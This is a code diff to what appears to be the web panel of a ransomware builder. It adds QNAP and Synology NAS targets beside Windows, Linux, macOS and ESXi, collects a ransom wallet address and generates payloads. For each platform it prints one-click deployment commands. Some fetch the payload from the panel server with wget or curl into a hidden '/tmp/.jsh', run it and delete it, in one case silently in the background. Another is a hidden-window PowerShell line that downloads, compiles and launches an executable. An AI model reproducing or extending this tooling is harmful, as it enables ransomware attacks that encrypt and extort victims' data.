@@ -68,6 +68,8 @@
       <option value="linux">🐧 Linux (Python3)</option>
       <option value="macos">🍎 macOS (Python3)</option>
       <option value="esxi">🖥️ VMware ESXi (Shell)</option>
+        <option value="qnap">🗄️ QNAP QTS (Shell)</option>
+        <option value="synology">🗄️ Synology DSM (Shell)</option>
     </select>
   </div>
 </div>
@@ -330,7 +332,7 @@ function genPayload(){
   fd.append('ransom_wallet',document.getElementById('ransom-wallet').value);
   fetch('/generate',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
     if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
-    var pn={'win':'Windows','linux':'Linux','macos':'macOS','esxi':'VMware ESXi'}[p]||p;
+     var pn={'win':'Windows','linux':'Linux','macos':'macOS','esxi':'VMware ESXi','qnap':'QNAP QTS','synology':'Synology DSM'}[p]||p;
     var dl='/payloads/'+d.file;
     var h='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+pn+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
     h+='<div style="margin-top:16px;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px">';
@@ -341,6 +343,12 @@ function genPayload(){
     }else if(p==='esxi'){
       var u=location.origin+dl;
       h+='<pre class="dt-code" style="margin:0"># ESXi SSH 一键部署\n# 方式1: wget\nwget -q '+u+' -O /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n# 方式2: curl\ncurl -sL '+u+' -o /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n# 方式3: 后台\nwget -q '+u+' -O /tmp/.jsh && nohup sh /tmp/.jsh > /dev/null 2>&1 &</pre>';
+     }else if(p==='qnap'||p==='synology'){
+       var u=location.origin+dl;
+       var sshhint=(p==='qnap')
+         ? '# QNAP: 控制台 > 网络和文件服务 > 启用 SSH'
+         : '# Synology: 控制面板 > 终端机和SNMP > 启用 SSH';
+       h+='<pre class="dt-code" style="margin:0"># NAS 一键部署（SSH 以 admin/root 登录后执行）\n'+sshhint+'\n\n# 方式1: wget\nwget -q '+u+' -O /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n# 方式2: curl\ncurl -sL '+u+' -o /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n# 方式3: 后台静默（断开 SSH 后继续）\nnohup sh -c "$(wget -qO- '+u+')" >/dev/null 2>&1 &</pre>';
     }else{
       h+='<pre class="dt-code" style="margin:0">:: PowerShell 下载运行\npowershell -w hidden -c "IWR \''+location.origin+dl+'\' -OutFile $env:TEMP\\j.cs; csc /target:winexe /out:$env:TEMP\\j.exe $env:TEMP\\j.cs; Start-Process $env:TEMP\\j.exe"</pre>';
     }
